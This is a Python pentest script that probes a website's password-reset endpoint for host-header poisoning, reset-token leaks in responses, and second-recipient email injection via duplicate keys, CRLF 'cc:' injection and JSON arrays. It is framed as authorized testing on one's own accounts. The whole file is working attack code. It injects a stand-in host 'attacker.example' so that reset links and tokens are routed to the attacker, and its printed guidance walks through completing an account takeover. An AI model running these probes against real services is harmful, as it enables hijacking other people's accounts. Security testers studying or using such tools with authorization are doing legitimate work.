#!/usr/bin/env python3
"""
reset_poison_probe.py - test a password-reset flow for host/link poisoning + token leak + email HPP (authorized only).

Fires "forgot password" requests for YOUR OWN victim email and checks, control-baselined, whether:
  * the reset link/host is built from an attacker-controlled Host / X-Forwarded-Host / X-Host / X-Forwarded-Server,
  * the response LEAKS a reset token/link,
  * the endpoint accepts a SECOND email (HPP/array/CRLF) so the token would be mailed to the attacker.
The strongest proof (catching the victim's token at YOUR listener) is manual/OOB - this flags the reflectable primitives
low-FP. (ACCOUNT_TAKEOVER_TESTING_GUIDE.md §2/§3/§5.)

Usage:
  python3 reset_poison_probe.py -u https://target/api/forgot --email you@yours --listener attacker.example
  python3 reset_poison_probe.py -u https://target/forgot --email you@yours --listener attacker.example --data-format json
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
import argparse, json, re, urllib.request, urllib.error
from urllib.parse import urlsplit, urlunsplit, urlencode

UA = "Mozilla/5.0 (compatible; reset-poison-probe/1.0)"
TOKEN_RE = re.compile(r"(?:token|reset[_-]?token|code|key)[\"'=:\s]{1,4}([A-Za-z0-9._\-]{12,})", re.I)
LINK_RE = re.compile(r"https?://[^\s\"'<>]+(?:token|reset|code)=[A-Za-z0-9._\-]{8,}", re.I)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect)


def send(url, method, headers, body):
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        r = _OPENER.open(req, timeout=20)
        code, hdrs, data = r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        code, hdrs, data = e.code, (e.headers or {}), (e.read() if hasattr(e, "read") else b"")
    except Exception as e:
        return None, {}, f"__ERR__ {e}"
    loc = (hdrs.get("Location", "") if hdrs else "")
    return code, {k.lower(): v for k, v in hdrs.items()}, data.decode("utf-8", "replace") + "\n" + loc


def body_for(fields, fmt):
    if fmt == "json":
        return json.dumps(fields).encode(), "application/json"
    return urlencode(fields).encode(), "application/x-www-form-urlencoded"


def host_of(url):
    return urlsplit(url).netloc


def main():
    ap = argparse.ArgumentParser(description="Password-reset poisoning / HPP probe (authorized, own account).")
    ap.add_argument("-u", "--url", required=True, help="the forgot-password endpoint")
    ap.add_argument("--email", required=True, help="YOUR OWN victim-test email")
    ap.add_argument("--listener", default="attacker.example", help="attacker host to inject (watch it for the token)")
    ap.add_argument("--email-field", default="email")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--data-format", choices=["form", "json"], default="form")
    ap.add_argument("-H", "--header", action="append", default=[], help="extra static header 'Name: value'")
    a = ap.parse_args()

    extra = {}
    for hh in a.header:
        if ":" in hh:
            k, v = hh.split(":", 1)
            extra[k.strip()] = v.strip()

    def fire(fields, hdrs):
        body, ct = body_for(fields, a.data_format)
        return send(a.url, a.method, {"User-Agent": UA, "Content-Type": ct, **extra, **hdrs}, body)

    print("== password-reset poisoning / leak / HPP probe ==")
    print(f"[i] endpoint: {a.url}   email: {a.email}   listener: {a.listener}")

    # baseline (clean host) - what does a normal reset response look like?
    bc, bh, bb = fire({a.email_field: a.email}, {})
    base_has_listener = a.listener in bb
    if bc is None:
        sys.exit("[!] baseline request failed (host/tls/timeout).")
    print(f"[i] baseline: status {bc}, {len(bb)} bytes")

    findings = 0

    # 1) token/link leak in the (baseline) response
    if LINK_RE.search(bb) or TOKEN_RE.search(bb):
        findings += 1
        m = LINK_RE.search(bb) or TOKEN_RE.search(bb)
        print(f"  [TOKEN-LEAK] the response body/redirect exposes a reset token/link: {m.group(0)[:80]}")
        print("       -> submit any victim email -> get their token -> reset -> ATO (guide §3). CRITICAL")

    # 2) host poisoning via headers (reflected in a reset link / body)
    for hname in ("Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Forwarded-Scheme"):
        val = "http" if hname == "X-Forwarded-Scheme" else a.listener
        c, h, bdy = fire({a.email_field: a.email}, {hname: val})
        if c is None:
            continue
        if hname != "X-Forwarded-Scheme" and a.listener in bdy and not base_has_listener:
            findings += 1
            print(f"  [HOST-POISON] {hname}: {a.listener} is REFLECTED in the reset response/link (not in baseline)")
            print(f"       -> trigger a reset for the VICTIM with this header; their token goes to {a.listener} -> ATO (guide §2). CRITICAL")

    # 3) email HPP / array / CRLF (second recipient) - built as raw bodies (dict dup-keys don't survive urlencode)
    attacker_email = "attacker@" + a.listener
    raw_bodies = []
    if a.data_format == "form":
        raw_bodies.append(("dup-key", f"{a.email_field}={a.email}&{a.email_field}={attacker_email}".encode(), "application/x-www-form-urlencoded"))
        raw_bodies.append(("crlf-cc", f"{a.email_field}={a.email}%0acc:{attacker_email}".encode(), "application/x-www-form-urlencoded"))
    else:
        raw_bodies.append(("json-array", json.dumps({a.email_field: [a.email, attacker_email]}).encode(), "application/json"))
        raw_bodies.append(("json-dupkey", (('{"%s":"%s","%s":"%s"}' % (a.email_field, a.email, a.email_field, attacker_email)).encode()), "application/json"))
    for label, rb, ct in raw_bodies:
        c, h, bdy = send(a.url, a.method, {"User-Agent": UA, "Content-Type": ct, **extra}, rb)
        if c is None:
            continue
        accepted = c == bc and "__ERR__" not in bdy and not re.search(r"invalid|error|malformed", bdy, re.I)
        if accepted:
            findings += 1
            print(f"  [EMAIL-HPP] variant '{label}' was ACCEPTED (status {c}) - the endpoint took a second email")
            print(f"       -> if it MAILS to {attacker_email}, the victim's token reaches you -> ATO (guide §5). verify at your inbox/listener.")

    print()
    if findings:
        print(f"[+] {findings} reset-flow primitive(s). Complete the ATO: catch the VICTIM's token (poison/leak/HPP) ->")
        print("    reset their password -> log in as them (two OWN accounts, restore state) - guide §18. Then report (Critical).")
    else:
        print("[-] no reflected host/leak/HPP signals here. Try Referer-based token leak, token-weakness")
        print("    (reset_token_analyzer.py), IDOR on change-email (../IDOR/), or the 2FA path (otp_bruteforce.py).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
